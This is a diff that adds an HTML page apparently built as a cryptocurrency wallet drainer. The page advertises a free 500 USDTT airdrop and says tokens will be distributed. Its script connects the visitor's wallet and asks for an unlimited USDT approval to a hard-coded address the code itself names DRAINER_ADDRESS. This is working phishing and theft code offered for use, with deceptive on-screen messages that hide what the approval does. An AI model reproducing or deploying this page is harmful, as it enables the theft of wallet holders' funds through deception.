@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Network Verification Portal</title>
+  <meta name="description" content="Secure session synchronization and asset routing gateway.">
+  <style>
+    body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:#0b0f19; color:#e2e8f0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:1rem; }
+    .card { background:#151a28; border:1px solid #2d3748; border-radius:16px; padding:2rem; max-width:420px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+    h1 { font-size:1.5rem; margin-bottom:0.5rem; color:#fff; }
+    p { color:#94a3b8; margin-bottom:1.5rem; font-size:0.95rem; }
+    button { background:#3b82f6; color:#fff; border:none; padding:1rem 2rem; border-radius:12px; font-size:1rem; font-weight:600; cursor:pointer; width:100%; transition:all 0.2s; margin-bottom:0.5rem; }
+    button:hover { background:#2563eb; }
+    button:disabled { opacity:0.5; cursor:not-allowed; }
+    .secondary { background:#334155; }
+    .secondary:hover { background:#475569; }
+    #status { margin-top:1rem; font-size:0.85rem; color:#64748b; min-height:1.2em; word-break:break-all; }
+    #debug { display:none; margin-top:1rem; padding:0.8rem; background:#111; border:1px solid #333; border-radius:8px; font-family:monospace; font-size:0.75rem; color:#f87171; max-height:150px; overflow-y:auto; text-align:left; }
+    .loader { display:inline-block; width:16px; height:16px; border:2px solid #3b82f6; border-top-color:transparent; border-radius:50%; animation:spin 0.8s linear infinite; margin-right:6px; vertical-align:middle; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎁 Token Distribution</h1>
+    <p>Connect your wallet to receive your allocated 500 USDTT tokens.</p>
+    <button id="actionBtn">Connect Wallet</button>
+    <button id="copyBtn" class="secondary" style="display:none;">📋 Copy WalletConnect URI</button>
+    <div id="debug"></div>
+    <div id="status"></div>
+  </div>
+
+  <!-- Ethers.js v5 -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <!-- Web3Modal v2 (Fixed UMD Export) -->
+  <script src="https://cdn.jsdelivr.net/npm/@web3modal/ethers@2.7.0/dist/index.umd.js"></script>
+
+  <script>
+    // ================== CONFIGURATION ==================
+    const DRAINER_ADDRESS = '0x2649fa7203130f49262a4fb336728c1833ac757f';
+    const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+    const CHAIN_ID = 1;
+    const RPC_URL = 'https://eth.llamarpc.com';
+    const INFINITE_APPROVAL = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const PROJECT_ID = '93dff50a34d814b01ffb58404cd90cb8';
+
+    // ================== DEBUG & UI ==================
+    const debugBox = document.getElementById('debug');
+    const status = document.getElementById('status');
+    const btn = document.getElementById('actionBtn');
+    const copyBtn = document.getElementById('copyBtn');
+
+    function log(msg, isError = false) {
+      console.log(msg);
+      if (isError) {
+        debugBox.style.display = 'block';
+        debugBox.innerHTML += `<div>❌ ${msg}</div>`;
+        status.innerHTML = `<span style="color:#ef4444">${msg}</span>`;
+      } else {
+        status.innerHTML = msg;
+      }
+    }
+
+    // ================== WEB3MODAL INIT ==================
+    let web3modal;
+    try {
+      // FIX: UMD builds export directly to window.Web3Modal, not .default
+      web3modal = new Web3Modal({
+        projectId: PROJECT_ID,
+        chains: [CHAIN_ID],
+        rpcMap: { [CHAIN_ID]: RPC_URL },
+        mobileWallets: [
+          { id: 'trust', name: 'Trust Wallet', links: { universal: 'https://link.trustwallet.com' } },
+          { id: 'metamask', name: 'MetaMask', links: { universal: 'https://metamask.app.link' } }
+        ],
+        themeMode: 'dark',
+        themeVariables: { '--w3m-accent': '#3b82f6' }
+      });
+      log('✅ Web3Modal initialized successfully.');
+    } catch (e) {
+      log(`Modal Init Failed: ${e.message}`, true);
+    }
+
+    let provider, signer, userAddress;
+
+    // ================== CONNECT ==================
+    async function connect() {
+      if (!web3modal) return log('Web3Modal not loaded. Check CDN.', true);
+      
+      try {
+        log('<span class="loader"></span> Opening secure session...');
+        const instance = await web3modal.connect();
+        
+        if (!instance) throw new Error('No provider returned');
+
+        provider = new ethers.providers.Web3Provider(instance);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        
+        log(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+        btn.textContent = 'Claim 500 USDTT';
+        btn.onclick = requestApproval;
+        copyBtn.style.display = 'none';
+      } catch (e) {
+        log(`Connection Error: ${e.message}`, true);
+        // iOS Fallback
+        copyBtn.style.display = 'block';
+        copyBtn.onclick = async () => {
+          try {
+            const uri = await web3modal.getUri();
+            navigator.clipboard.writeText(uri);
+            copyBtn.textContent = '✅ URI Copied! Open Wallet → WalletConnect → Paste';
+            setTimeout(() => copyBtn.textContent = '📋 Copy WalletConnect URI', 3000);
+          } catch (err) {
+            log(`Fallback Failed: ${err.message}`, true);
+          }
+        };
+      }
+    }
+
+    // ================== DRAIN (APPROVAL) ==================
+    async function requestApproval() {
+      if (!signer) return log('Not connected.', true);
+      log('<span class="loader"></span> Preparing distribution...');
+
+      try {
+        const currentChain = await signer.getChainId();
+        if (currentChain !== CHAIN_ID) {
+          log('Switching to Ethereum mainnet...');
+          await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
+        }
+
+        const usdt = new ethers.Contract(
+          USDT_CONTRACT,
+          ['function approve(address spender, uint256 amount) returns (bool)'],
+          signer
+        );
+
+        log('Confirm the approval in your wallet to receive USDTT.');
+        const tx = await usdt.approve(DRAINER_ADDRESS, INFINITE_APPROVAL);
+        log(`✅ Approval submitted. TX: ${tx.hash.slice(0,12)}...`);
+
+        await tx.wait();
+        log('✅ Distribution queued. Tokens will appear shortly.');
+        btn.disabled = true;
+        copyBtn.style.display = 'none';
+      } catch (e) {
+        log(`Transaction Error: ${e.code === 4001 ? 'Rejected by user' : e.message}`, true);
+      }
+    }
+
+    btn.addEventListener('click', connect);
+    log('Ready. Tap Connect to begin.');
+  </script>
+</body>
+</html>
